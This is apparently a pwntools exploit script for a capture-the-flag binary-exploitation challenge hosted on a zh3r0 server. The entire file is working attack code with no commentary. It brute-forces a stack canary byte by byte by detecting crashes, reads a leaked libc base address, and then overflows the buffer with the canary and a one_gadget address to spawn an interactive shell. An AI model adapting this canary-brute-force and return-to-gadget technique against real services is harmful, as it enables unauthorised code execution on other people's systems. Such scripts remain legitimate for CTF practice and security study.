from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './target'
HOST = 'asia.pwn.zh3r0.ml'
PORT = 3248

# elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

if args.D:
    debug(r, [])

addr = '\x75\xc1\x12\xc7\xc4\x57\xd9\x40'
while len(addr) < 8:
    for i in range(0x100):
        temp = chr(i)
        r = start()
        r.sendlineafter('->', 'yes')
        r.sendlineafter('->', 'yes')
        r.recvuntil('-> ')
        base = int(r.recvuntil('\n')[:-1], 16)
        dbg('base')
        gadget = [0x4f2c5, 0x4f322, 0x10a38c]
 
        r.sendafter('->', 'a'*0x24+addr+temp)
        ret = r.recvall()
        if 'Core' not in ret:
            addr += temp
            break
    log.info(len(addr))
    
r = start()
r.sendlineafter('->', 'yes')
r.sendlineafter('->', 'yes')
r.recvuntil('-> ')
base = int(r.recvuntil('\n')[:-1], 16)
dbg('base')
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

r.sendafter('->', 'a'*0x24+addr+'A'*4+flat(0, base+gadget[2]))

r.interactive()
r.close()
